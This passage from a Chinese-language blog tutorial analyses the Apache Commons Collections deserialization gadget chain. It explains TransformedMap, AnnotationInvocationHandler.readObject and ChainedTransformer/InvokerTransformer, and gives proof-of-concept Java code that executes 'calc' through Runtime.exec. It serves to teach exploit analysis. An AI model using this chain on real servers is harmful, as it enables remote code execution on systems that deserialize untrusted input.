class="comment">//接受三个参数，第一个为Map,我们可以传入之前讲到的HashMap,第二个和第三个就是Transformer我们需要的了，可控。</span></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">    <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//接受一个对象类型的参数</span></span><br><span class="line"><span class="comment">//返回valueTransformer对应的transform方法，那么我们这里就需要让valueTransformer为我们之前的invokerTransformer对象</span></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>所以我们可以在传入valueTransformer这个参数时让其为invokerTransformer对象，但是由于该类是protected的类型所以不能直接实例化，但是我们发现该类中有一个静态方法 decorate()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>所以可以直接调用该方法，将invokerTransformer对象注入进去。此时CheckSetValue中的valueTransformer就可以被我们改为invokerTransformer对象。那么接下来就需要找到一个可以触发CheckSetValue的方法。通过调试可以找到一个MapEntry类中的setValue方法调用了该方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MapEntry</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapEntryDecorator</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** The parent map */</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">MapEntry</span><span class="params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(entry);</span><br><span class="line">            <span class="built_in">this</span>.parent = parent;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">            value = parent.checkSetValue(value);</span><br><span class="line">            <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在MapEntry方法中，Entry代表的是Map中的一个键值对，而我们在Map中我们可以看到有setValue方法，而我们在对Map进行遍历的时候可以调用setValue这个方法。简单来说就是通过通过对setValue()方法的调用来触发checkSetValue()方法 MapEntry的父类AbstractMapEntryDecorator又引入了Map.Entry接口，所以我们只需要进行常用的Map遍历，就可以调用setValue()，，然后水到渠成的调checkSetValue()</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714488730452-190b8a98-e1fa-4f85-8bf0-c42460d081fe.png" alt=""></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>); <span class="comment">//给map一个键值对，方便遍历</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造transformedmap是调用tranform()的前置条件</span></span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(</span><br><span class="line">                map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(Map.Entry entry:transformedMap.entrySet()) &#123;   <span class="comment">//遍历Map常用格式</span></span><br><span class="line">            <span class="comment">//调用setValue方法，通过setValue去触发checkSetValue()</span></span><br><span class="line">            entry.setValue(runtime);      </span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>梳理一遍过程：</p><p>首先，我们找到了TransformedMap这个类，我们想要调用其中的checkSetValue方法，但是这个类的构造器是peotected权限，只能类中访问，所以我们调用decorate方法来实例化这个类，</p><p>在此之前我们先实例化了一个HashMap,并且调用了put方法给他赋了一个键值对(这里是为了让我们再后边的遍历中调用setValue()提供前置条件)，然后把这个map当成参数传入，实例化成了一个transformedmap对象，这个对象也是Map类型的，</p><p>然后我们对这个对象进行遍历，在遍历过程中我们可以调用setValue方法，而恰好又遇到了一个重写了setValue的父类，这个重写的方法刚好调用了checkSetValue方法，这样就形成了一个闭环</p><p>下面就是找到一个readObject中调用了setValue这个方法：找到了AnnotationInvocationHandler这个类中的readObject调用了该方法如下代码所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            annotationType = AnnotationType.getInstance(type);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">        <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>可以找到该类的构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">            superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">            superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到memberValue是可控的是可以由构造方法直接传入的。所以接下来我们可以着手构造一下该链，但是在写的时候由于该类是java的内部类所以需要反射来调用如下代码所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义序列化方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义反序列化方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>); <span class="comment">//给map一个键值对，方便遍历</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造transformedmap是调用tranform()的前置条件</span></span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(</span><br><span class="line">                map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取sun.reflect.annotation.AnnotationInvocationHandler类的Class对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class, transformedMap);</span><br><span class="line">        <span class="comment">//serialize(o);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>反序列化时运行报错这是为什么:</p><p>问题1：</p><p><a href="https://xz.aliyun.com/t/7031?time__1311=n4%2BxnD0GDti%3DLxQTq05%2BbDyCbdbd4YvjPx&amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Ft%2F12715%3Ftime__1311%3DmqmhDvOD7GkD8Dl6%252BG78cyuxfhDIgD0I5x%26alichlgref%3Dhttps%253A%252F%252Fwww.google.com%252F#toc-7">https://xz.aliyun.com/t/7031?time__1311=n4%2BxnD0GDti%3DLxQTq05%2BbDyCbdbd4YvjPx&amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Ft%2F12715%3Ftime__1311%3DmqmhDvOD7GkD8Dl6%252BG78cyuxfhDIgD0I5x%26alichlgref%3Dhttps%253A%252F%252Fwww.google.com%252F#toc-7</a></p><p>通过查看Runtime类发现没有实现serializable是不可序列化的所以需要通过反射来进行构造</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714491023957-6fd90bbe-7cf0-428e-b273-33c398566325.png" alt=""></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class rc=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);                 <span class="comment">//获取类原型</span></span><br><span class="line">        Method getRuntime= rc.getDeclaredMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>);    <span class="comment">//获取getRuntime方法，</span></span><br><span class="line">        Runtime r=(Runtime) getRuntime.invoke(<span class="literal">null</span>,<span class="literal">null</span>);    <span class="comment">//获取实例化对象，因为该方法为无参方法，所以全为null</span></span><br><span class="line">        Method exec=rc.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class);        <span class="comment">//获取exec方法</span></span><br><span class="line">        exec.invoke(r,<span class="string">&quot;calc&quot;</span>); </span><br></pre></td></tr></table></figure><p>我们需要将其改造成InvokerTransformer的形式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">getRuntime</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">         <span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;).transform(Runtime.class);</span><br><span class="line"></span><br><span class="line"> <span class="comment">//这里模拟获取invoke方法</span></span><br><span class="line"> <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">         <span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;).transform(getRuntime);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="comment">//这里模拟获取exec方法，并进行命令执行</span></span><br><span class="line"> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, </span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(runtime);</span><br></pre></td></tr></table></figure><p>在这里解释下为什么需要获取getMethod方法而不是直接获取getRuntime，因为我们传入的是Runtime.class对象在InvokerTransformer类中的transform方法会在获取其class，所以就变成java.lang.class对象了，这个类是不存在getRuntime方法的所以需要先反射获取getMethod方法，在通过invoke传入的Runtime.class对象，获得其getruntime方法因为此时获取的method对象所以还需要在反射调用invoke来将getruntime的实例获取出。此处具体参考<a href="https://xz.aliyun.com/t/7031?time__1311=n4%2BxnD0GDti%3DLxQTq05%2BbDyCbdbd4YvjPx&amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Ft%2F12715%3Ftime__1311%3DmqmhDvOD7GkD8Dl6%252BG78cyuxfhDIgD0I5x%26alichlgref%3Dhttps%253A%252F%252Fwww.google.com%252F#toc-7">https://xz.aliyun.com/t/7031?time__1311=n4%2BxnD0GDti%3DLxQTq05%2BbDyCbdbd4YvjPx&amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Ft%2F12715%3Ftime__1311%3DmqmhDvOD7GkD8Dl6%252BG78cyuxfhDIgD0I5x%26alichlgref%3Dhttps%253A%252F%252Fwww.google.com%252F#toc-7</a></p><h4 id="对于runtime反射获取改成InvokerTransformer形式的解释：">对于runtime反射获取改成InvokerTransformer形式的解释：</h4><p><font style="color:rgb(51, 51, 51);">既然我们没法在客户端序列化写入Runtime的实例，那就让服务端执行我们的命令生成一个Runtime实例呗？<br></font>我们知道Runtime的实例是通过Runtime.getRuntime()来获取的，而InvokerTransformer<font style="color:rgb(51, 51, 51);">里面的反射机制可以执行任意函数。<br></font>同时，我们已经成功执行过Runtime类里面的exec函数。讲道理肯定是没问题的.</p><p>我们先看getRuntiime方法的参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Runtime <span class="title function_">getRuntime</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> currentRuntime;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有参数，那就非常简单了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//得到Runtime class</span></span><br><span class="line">    <span class="comment">//由于InvokerTransformer的构造函数要求传入Class类型的参数类型，和Object类型的参数数值，所以封装一下，下面也一样</span></span><br><span class="line">    <span class="comment">//上面传入Runtime.class，调用Runtime class的getRuntime方法（由于是一个静态方法，invoke调用静态方法，传入类即可）</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;),</span><br><span class="line">    <span class="comment">//上面Runtime.getRuntime()得到了实例，作为这边的输入(invoke调用普通方法，需要传入类的实例)     </span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">transformerChain.transform(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p><font style="color:rgb(119, 119, 119);">在这里，之前自己陷入了一个很傻逼的问题，即：InvokerTransformer类transform方法中return method.invoke()这个语句<br></font><font style="color:rgb(119, 119, 119);">invoke()调用到底return了啥?<br></font><font style="color:rgb(119, 119, 119);">因为在这里形成了一个调用return的结果，再调用的链。为什么就可以上一个输出作为下一个输入时，可以成功调用了呢？<br></font><font style="color:rgb(119, 119, 119);">一开始以为invoke会统一返回一个对象作为下一个输入什么的，并且在调试的时候每次invoke的结果都不一样，源码看的头晕。<br></font><font style="color:rgb(119, 119, 119);">实际上是钻了死胡同：invoke的return是根据被调用的函数return啥，invoke就return啥。<br></font><font style="color:rgb(119, 119, 119);">就好比我invoke一个我自定义的方法a，在a中，我return了字符串&quot;1&quot;。那么就是invoke的结果就是字符串&quot;1&quot;。<br></font>看以上的过程就是第一次Runtime.getRuntime()的结果输入了下一个InvokerTransformer</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714491785599-c0467126-1b38-443b-b3c4-b0c79d7f1e12.png" alt=""></p><p>以上感觉是万事大吉了！但是实际上并不是…</p><p>回想之前对于InvokerTransformer中Class cls = input.getClass();的解释</p><p>这里我们需要注意到input.getClass()这个方法使用上的一些区别：</p><ul><li>当input是一个类的实例对象时，获取到的是这个类</li><li>当input是一个类时，获取到的是java.lang.Class</li></ul><p>我们来推演第一次InvokerTransformer的反射调用，即得到Runtime类对象的getRuntime方法调用:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//InvokeTransformer关键语句：</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;<span class="comment">//input为我们设置的常量Runtime.class</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();<span class="comment">//！！！这里由于input是一个类，会得到java.lang.Class</span></span><br><span class="line"><span class="comment">//在java.lang.Class类中去寻找getRuntime方法企图得到Runtime类对象，此处报错！！</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:rgb(51, 51, 51);">那么我们好像陷入了一个死胡同：<br></font><font style="color:rgb(51, 51, 51);">得到Runtime类实例才能调用exec方法。<br></font>而得到Runtime类实例作为input，才能得到Runtime class，才能找到getRuntime方法，得到Runtime类实例…</p><p>第二点九步 还是反射机制</p><p>那么我们通过直接调用Runtime.getRuntime方法好像是行不通了,有没有其他方法呢？</p><p><strong>还是反射机制</strong></p><p>已知：</p><ol><li>我们开头不能获得Class.forName(“java.lang.Runtime”)，只能得到Class.forName(“java.lang.Class”)</li><li><font style="color:rgb(51, 51, 51);">我们可以有任意的反射机制<br></font>求：</li><li><font style="color:rgb(51, 51, 51);">我们要获取到Runtime.getRunime函数，并执行它。<br></font>解：</li><li>通过反射机制获取反射机制中的getMethod类，由于getMethod类是存在Class类中，就符合开头Class类的限制</li><li>通过getMethod函数获取Runtime类中的getRuntime函数<ul><li>在哪个类中调用getMethod去获取方法，实际上是由invoke函数里面的的第一个参数obj决定的</li></ul></li><li>再通过反射机制获取反射机制中的invoke类，执行上面获取的getRuntime函数</li><li>invoke调用getRuntime函数，获取Runtime类的实例<ul><li>这里在使用反射机制调用getRuntime静态类时，invoke里面第一个参数obj其实可以任意改为null，或者其他类，而不一定要是Runtime类</li></ul></li></ol><p>具体变化细节，我选择把它放在反射机制一文中说明，这边给出结果。</p><p><font style="color:rgb(51, 51, 51);">我们的最终目的是执行<br></font>Class.forName(“java.lang.Runtime”).getMethod(“getRuntime”).invoke(Class.forName(“java.lang.Runtime”)</p><p>先来获取getRuntime类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//目标语句</span></span><br><span class="line">Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>)</span><br><span class="line"><span class="comment">//使用java.lang.Class开头</span></span><br><span class="line">Class.forName(<span class="string">&quot;java.lang.Class&quot;</span>).getMethod(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;)</span><br><span class="line">.invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>),<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="comment">//invoke函数的第一个参数是Runtime类，我们需要在Runtime类中去执行getMethod，获取getRuntime参数</span></span><br></pre></td></tr></table></figure><p>对照着InvokerTransformer类转变为transformers格式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();<span class="comment">//cls = java.lang.Class</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes); <span class="comment">//getMethod方法</span></span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs); <span class="comment">//在Runtime中找getRuntime方法，并返回这个方法</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="comment">//还需要填充 调用getRuntime得到Runtime实例,</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, 